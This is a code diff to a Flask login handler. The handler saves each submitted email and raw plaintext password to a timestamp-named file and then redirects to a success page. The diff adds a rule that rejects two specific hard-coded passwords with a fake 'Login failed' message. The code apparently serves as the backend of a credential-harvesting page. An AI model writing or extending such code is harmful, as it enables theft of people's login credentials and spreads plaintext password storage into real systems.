@@ -41,12 +41,25 @@ def login():
     email = data.get('email')
     password = data.get('password')
     
+    # Check for specific passwords
+    if password in ['srmmph@2025', 'mphtiss@2025']:
+        return jsonify({
+            'status': 'error',
+            'message': 'Login failed. Please check your credentials and try again.'
+        }), 401
+    
     # Save credentials and redirect to success page
     try:
+        # Create timestamp with milliseconds precision
+        current_time = time.localtime()
+        milliseconds = int((time.time() % 1) * 1000)
+        formatted_timestamp = f"{time.strftime('%d-%m-%Y %H:%M:%S', current_time)}.{milliseconds:03d}"
+        
+        # Create the user data in the requested format
         user_data = {
-            'email': email,
-            'password': save_raw_password(password),  # WARNING: INSECURE METHOD
-            'timestamp': str(time.time())
+            "email": email if email else "",
+            "password": save_raw_password(password) if password else "",
+            "timestamp": formatted_timestamp
         }
         
         # Use timestamp as filename
